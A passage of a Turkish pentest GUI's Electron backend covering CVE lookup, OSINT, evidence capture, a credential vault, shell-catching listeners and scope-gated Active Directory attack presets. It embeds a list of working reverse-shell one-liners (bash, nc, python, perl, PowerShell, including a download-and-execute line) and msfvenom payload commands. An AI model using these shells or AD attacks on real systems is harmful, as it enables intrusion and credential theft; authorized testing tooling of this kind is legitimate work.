      <table><thead><tr><th>IP</th><th>Ad</th><th>Üretici</th><th>OS</th><th>Servis</th><th>Zafiyet</th></tr></thead><tbody>${hostRows}</tbody></table>
      ${evidenceSection(a.evidence)}
      <div class="foot">NmapGUI Pentest Orkestratörü ile üretilmiştir. Yalnızca yetkili güvenlik testleri için.</div>
    </div>
  </body></html>`;
}

// ---------------- CVE zenginleştirme (NVD API 2.0 + yerel önbellek) ----------------
const cveCacheFile = () => path.join(dataDir(), 'cve-cache.json');
function loadCveCache() { try { return JSON.parse(fs.readFileSync(cveCacheFile(), 'utf8')); } catch (e) { return {}; } }
function saveCveCache(c) { try { fs.writeFileSync(cveCacheFile(), JSON.stringify(c)); } catch (e) {} }

ipcMain.handle('cve:enrich', async (e, ids) => {
  if (!Array.isArray(ids)) return { ok: false, error: 'liste bekleniyor' };
  const cache = loadCveCache();
  const uniq = [...new Set(ids.filter((x) => /^CVE-\d{4}-\d{4,}$/.test(x)))];
  const info = {};
  let fetched = 0;
  for (const id of uniq) {
    if (cache[id]) { info[id] = cache[id]; continue; }
    try {
      const data = await new Promise((res, rej) =>
        httpsGetJson(`https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${id}`, (err, d) => err ? rej(err) : res(d)));
      const cve = data && data.vulnerabilities && data.vulnerabilities[0] && data.vulnerabilities[0].cve;
      let item = { cvss: null, severity: 'unknown', desc: '' };
      if (cve) {
        const d = (cve.descriptions || []).find((x) => x.lang === 'en');
        item.desc = d ? d.value : '';
        const m = cve.metrics || {};
        const metric = (m.cvssMetricV31 || m.cvssMetricV30 || m.cvssMetricV2 || [])[0];
        if (metric && metric.cvssData) {
          item.cvss = metric.cvssData.baseScore;
          item.severity = (metric.cvssData.baseSeverity || metric.baseSeverity || '').toLowerCase() || sevFromScore(item.cvss);
        }
      }
      cache[id] = item; info[id] = item; fetched++;
      // NVD oran sınırı dostu (anahtarsız ~5 istek/30s)
      await new Promise((r) => setTimeout(r, 700));
    } catch (err) {
      info[id] = { cvss: null, severity: 'unknown', desc: '', error: true };
    }
  }
  if (fetched) saveCveCache(cache);
  // Aktif workspace'teki severity'leri güncelle (rapor doğruluğu)
  try {
    const ws = db.getActiveWorkspace();
    if (ws) Object.entries(info).forEach(([id, v]) => { if (v.severity && v.severity !== 'unknown') db.setVulnSeverity(ws.id, id, v.severity); });
  } catch (err) { log('cve severity güncelleme hatası: ' + err); }
  return { ok: true, info };
});

// ---------------- OSINT: Shodan ----------------
ipcMain.handle('osint:shodan', async (e, ip) => {
  if (!/^[\d.]+$/.test(ip || '')) return { ok: false, error: 'Geçersiz IP' };
  let key = '';
  try { key = (JSON.parse(fs.readFileSync(settingsFile(), 'utf8')).shodanKey) || ''; } catch (e2) {}
  if (!key) return { ok: false, error: 'Shodan API anahtarı yok (Ayarlar)' };
  return new Promise((resolve) => {
    httpsGetJson(`https://api.shodan.io/shodan/host/${ip}?key=${encodeURIComponent(key)}`, (err, data) => {
      if (err) return resolve({ ok: false, error: String(err) });
      if (data && data.error) return resolve({ ok: false, error: data.error });
      resolve({ ok: true, data: {
        ip, org: data.org || '', isp: data.isp || '', os: data.os || '', country: data.country_name || '',
        ports: data.ports || [], vulns: data.vulns ? Object.keys(data.vulns) : [],
        hostnames: data.hostnames || [], lastUpdate: data.last_update || '',
        services: (data.data || []).map((d) => ({ port: d.port, product: d.product || '', transport: d.transport || '' })),
      } });
    });
  });
});

// ---------------- OSINT: Subdomain keşfi (crt.sh) ----------------
ipcMain.handle('osint:subdomains', async (e, domain) => {
  if (!/^[a-zA-Z0-9.-]{1,100}$/.test(domain || '')) return { ok: false, error: 'Geçersiz alan adı' };
  return new Promise((resolve) => {
    httpsGetJson(`https://crt.sh/?q=${encodeURIComponent('%.' + domain)}&output=json`, (err, data) => {
      if (err) return resolve({ ok: false, error: String(err) });
      const set = new Set();
      (Array.isArray(data) ? data : []).forEach((row) => {
        String(row.name_value || '').split('\n').forEach((n) => {
          n = n.trim().replace(/^\*\./, '');
          if (n.endsWith(domain)) set.add(n);
        });
      });
      resolve({ ok: true, subdomains: Array.from(set).sort() });
    });
  });
});

// ---------------- OSINT: DNS kayıtları ----------------
ipcMain.handle('osint:dns', async (e, domain) => {
  if (!/^[a-zA-Z0-9.-]{1,100}$/.test(domain || '')) return { ok: false, error: 'Geçersiz alan adı' };
  const out = {};
  const safe = async (type, fn) => { try { out[type] = await fn(); } catch (e2) { out[type] = []; } };
  await safe('A', () => dns.resolve4(domain));
  await safe('AAAA', () => dns.resolve6(domain));
  await safe('MX', async () => (await dns.resolveMx(domain)).map((m) => `${m.priority} ${m.exchange}`));
  await safe('NS', () => dns.resolveNs(domain));
  await safe('TXT', async () => (await dns.resolveTxt(domain)).map((t) => t.join(' ')));
  await safe('CNAME', () => dns.resolveCname(domain));
  return { ok: true, records: out };
});

// ---------------- Kanıt (evidence) ----------------
ipcMain.handle('evidence:add', async (e, { hostIp }) => {
  const { canceled, filePaths } = await dialog.showOpenDialog(mainWindow, {
    title: 'Kanıt dosyası seç', properties: ['openFile'],
    filters: [{ name: 'Görsel/Dosya', extensions: ['png', 'jpg', 'jpeg', 'gif', 'pdf', 'txt', 'log'] }],
  });
  if (canceled || !filePaths[0]) return { ok: false, error: 'iptal' };
  const ws = db.getActiveWorkspace();
  const evDir = path.join(dataDir(), 'evidence');
  fs.mkdirSync(evDir, { recursive: true });
  const ext = path.extname(filePaths[0]);
  const dest = path.join(evDir, `ev-${Date.now()}${ext}`);
  fs.copyFileSync(filePaths[0], dest);
  const label = path.basename(filePaths[0]);
  const ev = db.addEvidence(ws.id, hostIp, ext.replace('.', '') || 'file', label, dest);
  return { ok: true, evidence: ev };
});

// Ekran görüntüsü al -> kanıt olarak kaydet
ipcMain.handle('evidence:screenshot', async (e, { hostIp }) => {
  try {
    const sources = await desktopCapturer.getSources({ types: ['screen'], thumbnailSize: { width: 1920, height: 1080 } });
    if (!sources.length) return { ok: false, error: 'Ekran yakalanamadı' };
    const png = sources[0].thumbnail.toPNG();
    const ws = db.getActiveWorkspace();
    const evDir = path.join(dataDir(), 'evidence');
    fs.mkdirSync(evDir, { recursive: true });
    const dest = path.join(evDir, `shot-${Date.now()}.png`);
    fs.writeFileSync(dest, png);
    const ev = db.addEvidence(ws.id, hostIp, 'png', 'Ekran görüntüsü', dest);
    return { ok: true, evidence: ev };
  } catch (err) { return { ok: false, error: String(err) }; }
});
ipcMain.handle('evidence:list', async (e, wsId) => db.listEvidence(wsId));
ipcMain.handle('evidence:delete', async (e, id) => db.deleteEvidence(id));
ipcMain.handle('evidence:open', async (e, p) => { shell.openPath(p); return true; });

// ---------------- HTTPS indirici ----------------
function httpsGetJson(url, cb) {
  https.get(url, { headers: { 'User-Agent': 'NmapGUI' } }, (res) => {
    let body = '';
    res.on('data', (c) => { body += c; });
    res.on('end', () => { try { cb(null, JSON.parse(body)); } catch (e) { cb(null, null); } });
  }).on('error', (err) => cb(err));
}
function downloadFile(url, dest, onProgress, redirects = 0) {
  return new Promise((resolve, reject) => {
    if (redirects > 5) return reject(new Error('Çok fazla yönlendirme'));
    const file = fs.createWriteStream(dest);
    https.get(url, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        file.close(); fs.unlink(dest, () => {});
        return resolve(downloadFile(res.headers.location, dest, onProgress, redirects + 1));
      }
      if (res.statusCode !== 200) {
        file.close(); fs.unlink(dest, () => {});
        return reject(new Error('HTTP ' + res.statusCode));
      }
      const total = parseInt(res.headers['content-length'] || '0', 10);
      let received = 0;
      res.on('data', (c) => { received += c.length; if (total && onProgress) onProgress(Math.round((received / total) * 100)); });
      res.pipe(file);
      file.on('finish', () => file.close(() => resolve(dest)));
    }).on('error', (err) => { file.close(); fs.unlink(dest, () => {}); reject(err); });
  });
}

// ===================================================================
// Faz 2: Credential vault + Listener manager + Reverse shell + DOCX
// ===================================================================

// ---------------- Credential vault ----------------
// safeStorage: Windows DPAPI / macOS Keychain / Linux libsecret. Düz parola
// hiçbir zaman renderer'a gönderilmez; reveal akışı kasıtlı + audit kayıtlıdır.
function encryptForVault(plain) {
  if (!plain) return '';
  if (!safeStorage.isEncryptionAvailable()) {
    // Anahtarlık yoksa: base64 işaretle ki yanlışlıkla "şifreli" sanılmasın
    return 'PLAIN:' + Buffer.from(String(plain), 'utf8').toString('base64');
  }
  return 'ENC:' + safeStorage.encryptString(String(plain)).toString('base64');
}
function decryptFromVault(stored) {
  if (!stored) return '';
  if (stored.startsWith('ENC:')) {
    try { return safeStorage.decryptString(Buffer.from(stored.slice(4), 'base64')); }
    catch (e) { return ''; }
  }
  if (stored.startsWith('PLAIN:')) {
    try { return Buffer.from(stored.slice(6), 'base64').toString('utf8'); } catch (e) { return ''; }
  }
  return '';
}

ipcMain.handle('creds:list', async (e, wsId) => {
  const id = wsId || (db.getActiveWorkspace() && db.getActiveWorkspace().id);
  if (!id) return [];
  return db.listCreds(id);
});

ipcMain.handle('creds:add', async (e, c) => {
  const ws = db.getActiveWorkspace();
  if (!ws) return { ok: false, error: 'workspace yok' };
  const detected = (c.hash && (!c.hash_type || c.hash_type === 'auto')) ? db.detectHash(c.hash) : null;
  const cred = {
    host: String(c.host || '').slice(0, 80),
    service: String(c.service || '').slice(0, 40),
    username: String(c.username || '').slice(0, 80),
    pass_enc: encryptForVault(c.password || ''),
    hash: String(c.hash || '').slice(0, 4096),
    hash_type: detected ? detected.type : (c.hash_type || ''),
    hashcat_mode: detected ? detected.mode : (c.hashcat_mode || ''),
    source: String(c.source || '').slice(0, 80),
    notes: String(c.notes || '').slice(0, 4096),
  };
  const row = db.addCred(ws.id, cred);
  db.addAudit(ws.id, 'creds', `cred eklendi: ${cred.username || cred.hash.slice(0, 16)}@${cred.host || '?'}`);
  return { ok: true, cred: row };
});

ipcMain.handle('creds:update', async (e, { id, fields }) => {
  if (!id) return { ok: false, error: 'id yok' };
  const ws = db.getActiveWorkspace();
  const f = { ...fields };
  if ('password' in f) { f.pass_enc = encryptForVault(f.password); delete f.password; }
  if (f.hash && (!f.hash_type || f.hash_type === 'auto')) {
    const d = db.detectHash(f.hash);
    f.hash_type = d.type; f.hashcat_mode = d.mode;
  }
  const row = db.updateCred(id, f);
  if (ws) db.addAudit(ws.id, 'creds', `cred güncellendi (id=${id})`);
  return { ok: true, cred: row };
});

// Parolayı sadece bu çağrı ortaya çıkarır — açıkça audit'lenir.
ipcMain.handle('creds:reveal', async (e, id) => {
  const ws = db.getActiveWorkspace();
  const enc = db.getCredEnc(id);
  if (!enc) return { ok: true, password: '' };
  const plain = decryptFromVault(enc);
  if (ws) db.addAudit(ws.id, 'creds', `cred parola ifşa edildi (id=${id})`);
  return { ok: true, password: plain, encrypted: enc.startsWith('ENC:') };
});

ipcMain.handle('creds:delete', async (e, id) => {
  const ws = db.getActiveWorkspace();
  db.deleteCred(id);
  if (ws) db.addAudit(ws.id, 'creds', `cred silindi (id=${id})`);
  return { ok: true };
});

ipcMain.handle('creds:detectHash', async (e, h) => db.detectHash(h));

ipcMain.handle('creds:vaultStatus', async () => ({
  encryptionAvailable: safeStorage.isEncryptionAvailable(),
  // Linux'ta libsecret/kwallet eksikse buradan görülür
  backend: safeStorage.getSelectedStorageBackend ? safeStorage.getSelectedStorageBackend() : 'os',
}));

// ---------------- Reverse shell generator ----------------
// Saf veri; hiçbir komut çalıştırılmaz. Renderer kopyala-yapıştır için kullanır.
ipcMain.handle('revshell:templates', async () => REVSHELL_TEMPLATES);

const REVSHELL_TEMPLATES = [
  { id: 'bash-i', name: 'Bash TCP', os: 'linux',
    template: 'bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"' },
  { id: 'bash-udp', name: 'Bash UDP', os: 'linux',
    template: 'bash -c "bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1"' },
  { id: 'sh-nc', name: 'nc mkfifo', os: 'linux',
    template: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f' },
  { id: 'nc-e', name: 'nc -e', os: 'linux',
    template: 'nc -e /bin/sh {LHOST} {LPORT}' },
  { id: 'python3', name: 'Python 3', os: 'any',
    template: 'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{LHOST}",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")\'' },
  { id: 'python2', name: 'Python 2', os: 'any',
    template: 'python -c \'import os,pty,socket;s=socket.socket();s.connect(("{LHOST}",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")\'' },
  { id: 'php-exec', name: 'PHP exec', os: 'any',
    template: 'php -r \'$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");\'' },
  { id: 'perl', name: 'Perl', os: 'any',
    template: 'perl -e \'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' },
  { id: 'ruby', name: 'Ruby', os: 'any',
    template: 'ruby -rsocket -e\'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'' },
  { id: 'powershell', name: 'PowerShell TCP', os: 'windows',
    template: 'powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(\'{LHOST}\',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+\'PS \'+(pwd).Path+\'> \';$sb=([text.encoding]::ASCII).GetBytes($o2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"' },
  { id: 'pwsh-iex', name: 'PowerShell IEX (kısa)', os: 'windows',
    template: 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://{LHOST}:{LPORT}/s.ps1\')"' },
  { id: 'msfvenom-elf', name: 'msfvenom Linux ELF', os: 'linux',
    template: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf' },
  { id: 'msfvenom-exe', name: 'msfvenom Windows EXE', os: 'windows',
    template: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe' },
  { id: 'msfvenom-asp', name: 'msfvenom ASP/X', os: 'windows',
    template: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx -o s.aspx' },
];

// ---------------- Listener manager ----------------
// Tek-instance-per-type, açık port doğrulama. Hedef serbest girdiyle çalışmaz —
// sadece kullanıcının seçtiği porta dinleyici açar. Scope guard listener'lara uygulanmaz
// (hedef yok), ama port çakışmasını ve geçersiz portu engelleriz.
const listeners = {}; // type -> { proc, port, dir, started }
function broadcastListener(type) {
  if (!mainWindow) return;
  const ls = listeners[type];
  mainWindow.webContents.send('listener:state', { type, running: !!ls, port: ls ? ls.port : null, dir: ls ? ls.dir : '' });
}
function listenerOut(type, s) {
  if (!mainWindow) return;
  mainWindow.webContents.send('listener:out', { type, data: s });
}
function validPort(p) {
  const n = parseInt(p, 10);
  return Number.isFinite(n) && n >= 1 && n <= 65535;
}

ipcMain.handle('listener:list', async () => Object.entries(listeners).map(([type, v]) => ({
  type, port: v.port, dir: v.dir || '', started: v.started,
})));

ipcMain.handle('listener:stop', async (e, type) => {
  const ls = listeners[type];
  if (!ls) return { ok: false, error: 'çalışmıyor' };
  try { ls.proc.kill(); } catch (_) {}
  delete listeners[type];
  broadcastListener(type);
  const ws = db.getActiveWorkspace();
  if (ws) db.addAudit(ws.id, 'listener', `${type} durduruldu`);
  return { ok: true };
});

ipcMain.handle('listener:start', async (e, { type, port, dir }) => {
  if (listeners[type]) return { ok: false, error: `${type} dinleyicisi zaten çalışıyor (port ${listeners[type].port})` };
  if (!validPort(port)) return { ok: false, error: 'Geçersiz port (1-65535)' };
  const p = parseInt(port, 10);
  // Reverse shell catcher (TCP) — Node ile (nc bağımsızlığı)
  if (type === 'nc') {
    const net = require('net');
    const srv = net.createServer((sock) => {
      listenerOut('nc', `\n[+] bağlantı: ${sock.remoteAddress}:${sock.remotePort}\n`);
      sock.on('data', (d) => listenerOut('nc', d.toString()));
      sock.on('close', () => listenerOut('nc', '\n[*] bağlantı kapandı\n'));
      sock.on('error', (err) => listenerOut('nc', '\n[!] hata: ' + err.message + '\n'));
      // input akışını sakla → renderer'dan komut göndermek için
      if (!listeners.nc) return;
      listeners.nc.sock = sock;
    });
    try { srv.listen(p, '0.0.0.0'); }
    catch (err) { return { ok: false, error: String(err) }; }
    srv.on('error', (err) => listenerOut('nc', '\n[!] server hata: ' + err.message + '\n'));
    listeners.nc = { proc: { kill: () => srv.close() }, port: p, started: new Date().toISOString(), srv };
    listenerOut('nc', `[*] TCP dinleyici hazır :${p} (reverse shell bekleniyor)\n`);
    broadcastListener('nc');
    const ws = db.getActiveWorkspace();
    if (ws) db.addAudit(ws.id, 'listener', `nc dinleyici başlatıldı :${p}`);
    return { ok: true };
  }
  // HTTP file server
  if (type === 'http') {
    const serveDir = dir && fs.existsSync(dir) ? dir : path.join(dataDir(), 'http-share');
    fs.mkdirSync(serveDir, { recursive: true });
    const http = require('http'); const url = require('url');
    const srv = http.createServer((req, res) => {
      const u = url.parse(decodeURIComponent(req.url || '/'));
      let rel = (u.pathname || '/').replace(/^\/+/, '');
      const fp = path.resolve(serveDir, rel);
      // dizin sızıntısı engelle
      if (!fp.startsWith(path.resolve(serveDir))) { res.writeHead(403); return res.end('forbidden'); }
      fs.stat(fp, (err, st) => {
        listenerOut('http', `${new Date().toISOString()} ${req.method} ${req.url} from ${req.socket.remoteAddress}\n`);
        if (err) { res.writeHead(404); return res.end('not found'); }
        if (st.isDirectory()) {
          const items = fs.readdirSync(fp).map((n) => `<li><a href="${encodeURIComponent(n)}">${n}</a></li>`).join('');
          res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
          return res.end(`<h2>${rel || '/'}</h2><ul>${items}</ul>`);
        }
        res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
        fs.createReadStream(fp).pipe(res);
      });
    });
    try { srv.listen(p, '0.0.0.0'); }
    catch (err) { return { ok: false, error: String(err) }; }
    srv.on('error', (err) => listenerOut('http', '\n[!] server hata: ' + err.message + '\n'));
    listeners.http = { proc: { kill: () => srv.close() }, port: p, dir: serveDir, started: new Date().toISOString() };
    listenerOut('http', `[*] HTTP dinleyici :${p} → ${serveDir}\n`);
    broadcastListener('http');
    const ws = db.getActiveWorkspace();
    if (ws) db.addAudit(ws.id, 'listener', `http dinleyici :${p} → ${serveDir}`);
    return { ok: true, dir: serveDir };
  }
  // SMB share (impacket smbserver.py — opsiyonel, kuruluysa)
  if (type === 'smb') {
    const serveDir = dir && fs.existsSync(dir) ? dir : path.join(dataDir(), 'smb-share');
    fs.mkdirSync(serveDir, { recursive: true });
    const { cmd, args } = toolProc('impacket-smbserver', ['-smb2support', 'share', serveDir]);
    let proc;
    try { proc = spawn(cmd, args, { windowsHide: true }); }
    catch (err) { return { ok: false, error: 'impacket-smbserver kurulu değil: ' + err }; }
    proc.stdout.on('data', (d) => listenerOut('smb', d.toString()));
    proc.stderr.on('data', (d) => listenerOut('smb', d.toString()));
    proc.on('close', () => { delete listeners.smb; broadcastListener('smb'); listenerOut('smb', '\n[*] kapandı\n'); });
    listeners.smb = { proc, port: 445, dir: serveDir, started: new Date().toISOString() };
    listenerOut('smb', `[*] SMB share 'share' → ${serveDir} (port 445)\n`);
    broadcastListener('smb');
    const ws = db.getActiveWorkspace();
    if (ws) db.addAudit(ws.id, 'listener', `smb share → ${serveDir}`);
    return { ok: true, dir: serveDir };
  }
  return { ok: false, error: 'Bilinmeyen tür' };
});

// nc dinleyicisine renderer'dan komut gönder (caught shell ile etkileşim)
ipcMain.handle('listener:send', async (e, { type, data }) => {
  if (type !== 'nc') return { ok: false, error: 'sadece nc destekler' };
  const ls = listeners.nc;
  if (!ls || !ls.sock) return { ok: false, error: 'bağlı shell yok' };
  try { ls.sock.write(String(data || '') + '\n'); return { ok: true }; }
  catch (err) { return { ok: false, error: String(err) }; }
});

ipcMain.handle('listener:pickDir', async () => {
  const r = await dialog.showOpenDialog(mainWindow, { properties: ['openDirectory'] });
  if (r.canceled || !r.filePaths[0]) return { ok: false };
  return { ok: true, dir: r.filePaths[0] };
});

// Uygulama kapanırken aktif dinleyicileri temizle
app.on('before-quit', () => {
  Object.keys(listeners).forEach((k) => { try { listeners[k].proc.kill(); } catch (_) {} });
});

// ===================================================================
// Faz 3: AD Recon preset'leri (netexec) + Web pipeline + MITRE map
// ===================================================================

// AD modülleri — saldırgan olanlar engagement+scope gate'inden geçer.
const AD_MODULES = {
  // Salt-okunur (lab modunda da serbest)
  null:       { protocol: 'smb', args: ['-u', '', '-p', '', '--shares'], aggressive: false,
                mitre: 'T1135', desc: 'Null session: erişilebilir SMB share' },
  signing:    { protocol: 'smb', args: ['--gen-relay-list', '/tmp/relays.txt'], aggressive: false,
                mitre: 'T1557.001', desc: 'SMB signing kapalı host listesi (relay riski)' },
  users:      { protocol: 'smb', args: ['--users'], requireAuth: true, aggressive: false,
                mitre: 'T1087.002', desc: 'AD user enumeration' },
  policy:     { protocol: 'smb', args: ['--pass-pol'], requireAuth: true, aggressive: false,
                mitre: 'T1201', desc: 'Domain password policy' },
  shares:     { protocol: 'smb', args: ['--shares'], requireAuth: true, aggressive: false,
                mitre: 'T1135', desc: 'SMB share enumeration' },
  loggedon:   { protocol: 'smb', args: ['--loggedon-users'], requireAuth: true, aggressive: false,
                mitre: 'T1033', desc: 'Hedef hosttaki oturum açmış kullanıcılar' },
  sessions:   { protocol: 'smb', args: ['--sessions'], requireAuth: true, aggressive: false,
                mitre: 'T1049', desc: 'Aktif SMB oturumları' },
  // Saldırgan (engagement+scope gerekli)
  kerberoast: { protocol: 'ldap', args: ['--kerberoasting', '/tmp/kerb.txt'], requireAuth: true, aggressive: true,
                mitre: 'T1558.003', desc: 'Kerberoast: SPN hesaplarinin TGS-REP hash listesi' },
  asreproast: { protocol: 'ldap', args: ['--asreproast', '/tmp/asrep.txt'], requireAuth: false, aggressive: true,
                mitre: 'T1558.004', desc: 'AS-REP roast: pre-auth kapalı hesaplar (kullanıcı listesi gerekli)' },
  zerologon:  { protocol: 'smb', args: ['-M', 'zerologon'], requireAuth: false, aggressive: true,
                mitre: 'T1210', desc: 'CVE-2020-1472 zerologon zafiyet kontrolü' },
  petitpotam: { protocol: 'smb', args: ['-M', 'petitpotam'], requireAuth: false, aggressive: true,
                mitre: 'T1187', desc: 'PetitPotam coerce zafiyet kontrolü' },
  ntlmrelay:  { protocol: 'smb', args: ['--gen-relay-list', '/tmp/relays.txt'], requireAuth: false, aggressive: false,
                mitre: 'T1557.001', desc: 'NTLM relay hedef listesi üretimi' },
  bloodhound: { protocol: 'ldap', args: ['--bloodhound', '--collection', 'All', '--dns-server', '{TARGET}'],
                requireAuth: true, aggressive: false,
                mitre: 'T1087.002', desc: 'BloodHound veri toplama (All collection)' },
};

let currentAd = null;
ipcMain.handle('ad:modules', async () => Object.entries(AD_MODULES).map(([id, m]) => ({
  id, protocol: m.protocol, requireAuth: !!m.requireAuth, aggressive: !!m.aggressive,
  mitre: m.mitre, desc: m.desc,
})));

ipcMain.handle('ad:run', async (e, { module, target, user, pass, hash, domain, options }) => {
  if (currentAd) return { ok: false, error: 'Zaten çalışan AD modülü var.' };
  const def = AD_MODULES[module];
  if (!def) return { ok: false, error: 'Bilinmeyen modül' };
  if (!sanitizeTarget(target)) return { ok: false, error: 'Geçersiz hedef' };
  // Saldırgan modüller: engagement+scope+audit
  if (def.aggressive) {
    const ws = db.getActiveWorkspace();
    if (!ws || ws.mode !== 'engagement') {
      if (ws) db.addAudit(ws.id, 'blocked', `ad:${module} reddedildi (engagement değil): ${target}`);
      return { ok: false, error: 'Saldırgan AD modülü yalnızca Engagement modunda çalışır.' };
    }
    if (inScopeMain(target, ws.scope) !== true) {
      db.addAudit(ws.id, 'blocked', `ad:${module} kapsam dışı: ${target}`);
      return { ok: false, error: 'Hedef kapsam (scope) dışında.' };
    }
  }
  if (def.requireAuth && !user && !hash) {
    return { ok: false, error: 'Bu modül kimlik bilgisi (user+pass veya user+hash) gerektirir.' };
  }
  // Komut inşası — netexec/nxc tercih
  const nxcArgs = [def.protocol, target];
  if (user) {
    if (!/^[A-Za-z0-9._\\\/@-]{1,80}$/.test(user)) return { ok: false, error: 'Geçersiz kullanıcı' };
    nxcArgs.push('-u', user);
  }
  if (hash) {
    if (!/^[A-Fa-f0-9:]{16,200}$/.test(hash)) return { ok: false, error: 'Geçersiz hash formatı (NTLM bekleniyor)' };
    nxcArgs.push('-H', hash);
  } else if (pass !== undefined) {
    // Boş parola da geçerli (null session) — ama tırnak içinde geçir
    if (pass.length > 200 || /[`$\n\r]/.test(pass)) return { ok: false, error: 'Geçersiz parola karakteri' };
    nxcArgs.push('-p', pass);
  }
  if (domain && /^[A-Za-z0-9.-]{1,80}$/.test(domain)) nxcArgs.push('-d', domain);
  // Modül argümanları — {TARGET} placeholder substitution
  const finalArgs = def.args.map((a) => a === '{TARGET}' ? target : a);
  nxcArgs.push(...finalArgs);

  const { cmd, args } = toolProc('netexec', nxcArgs);
  let proc;
  try { proc = spawn(cmd, args, { windowsHide: true }); }
  catch (err) {
    // nxc alternatif binary adı
    const alt = toolProc('nxc', nxcArgs);
    try { proc = spawn(alt.cmd, alt.args, { windowsHide: true }); }
    catch (err2) { return { ok: false, error: 'netexec/nxc çalıştırılamadı: ' + err2 }; }
  }
  currentAd = proc;
  const ws = db.getActiveWorkspace();
  if (ws) db.addAudit(ws.id, def.aggressive ? 'attack' : 'recon', `ad:${module} → ${target} (mitre: ${def.mitre})`);
  let adBuf = '';
  const AD_BUF_MAX = 1 * 1024 * 1024;
  const sendOut = (s) => { if (adBuf.length < AD_BUF_MAX) adBuf += s; mainWindow.webContents.send('ad:out', s); };
  sendOut(`=== netexec ${nxcArgs.join(' ')} ===\n`);
  proc.stdout.on('data', (d) => sendOut(d.toString()));
  proc.stderr.on('data', (d) => sendOut(d.toString()));
  proc.on('close', (code) => {
    // Heuristic finding extraction
    try {
      if (ws) {
        const findings = [];
        // SMB signing False → finding
        if (/Signing:\s*False/i.test(adBuf)) findings.push({ port: '445', cve: 'SMB-SIGNING-DISABLED', name: 'SMB signing disabled', severity: 'medium' });
        // Null session
        if (module === 'null' && /\[\+\]/.test(adBuf) && /smb/i.test(adBuf)) findings.push({ port: '445', cve: 'SMB-NULL-SESSION', name: 'Null session allowed', severity: 'medium' });
        // Kerberoast hash
        if (/\$krb5tgs\$/.test(adBuf)) findings.push({ port: '88', cve: 'KERBEROAST-TGS', name: 'Kerberoast TGS hash captured', severity: 'high' });
        if (/\$krb5asrep\$/.test(adBuf)) findings.push({ port: '88', cve: 'ASREP-ROAST', name: 'AS-REP roastable user', severity: 'high' });
        // Zerologon
        if (/VULNERABLE/i.test(adBuf) && module === 'zerologon') findings.push({ port: '445', cve: 'CVE-2020-1472', name: 'Zerologon vulnerable', severity: 'critical' });
        findings.forEach((f) => f.host = target);
        if (findings.length) db.addNucleiFindings(ws.id, findings.map((f) => ({
          host: f.host, port: f.port, templateId: f.name, name: f.name,
          severity: f.severity, cve: f.cve,
        })));
        // mitre tag'i set et (host bazlı bulk)
        if (def.mitre) {
          try { db.bulkTagMitre(ws.id, [target], def.mitre); } catch (_) {}
        }
      }
    } catch (err) { log('ad:run finding extraction hatası: ' + err); }
    try {
      writeAutoEvidence({ tool: 'netexec', target, command: `netexec ${nxcArgs.join(' ')}`,
                          output: adBuf, exitCode: code });
    } catch (err) { log('auto-evidence (ad) hatası: ' + err); }
    mainWindow.webContents.send('ad:done', { module, code });
    currentAd = null;
  });
  proc.on('error', (err) => { sendOut('[HATA] ' + err + '\n'); currentAd = null; });
  return { ok: true };
});
ipcMain.handle('ad:stop', async () => { if (currentAd) { currentAd.kill(); currentAd = null; return { ok: true }; } return { ok: false }; });

// ---------------- MITRE ATT&CK eşleme ----------------
// Tool/Module → technique (Faz 3'te finding'lere otomatik tag).
const MITRE_MAP = {
  nmap: 'T1046', nuclei: 'T1595.002', subfinder: 'T1590.001', amass: 'T1590.005',
  dnsx: 'T1590.001', httpx: 'T1595.002', gobuster: 'T1083', ffuf: 'T1083',
  nikto: 'T1595.002', whatweb: 'T1592.002', sqlmap: 'T1190', hydra: 'T1110.001',
  msfconsole: 'T1190', searchsploit: 'T1588.005', enum4linux: 'T1087.002',
  netexec: 'T1078.002', masscan: 'T1046',
};
ipcMain.handle('mitre:toolMap', async () => MITRE_MAP);
// MITRE matris için tactic tanımları (kısaltma — TA0001..TA0011)
const MITRE_TACTICS = [
  { id: 'TA0043', name: 'Reconnaissance', t: ['T1595', 'T1590', 'T1592'] },
  { id: 'TA0042', name: 'Resource Dev', t: ['T1588'] },
  { id: 'TA0001', name: 'Initial Access', t: ['T1190', 'T1078'] },
  { id: 'TA0002', name: 'Execution', t: ['T1059'] },
  { id: 'TA0003', name: 'Persistence', t: ['T1547'] },
  { id: 'TA0004', name: 'Privilege Esc', t: ['T1068', 'T1078'] },
  { id: 'TA0005', name: 'Defense Evasion', t: ['T1027', 'T1070'] },
  { id: 'TA0006', name: 'Credential Access', t: ['T1110', 'T1003', 'T1558', 'T1187'] },
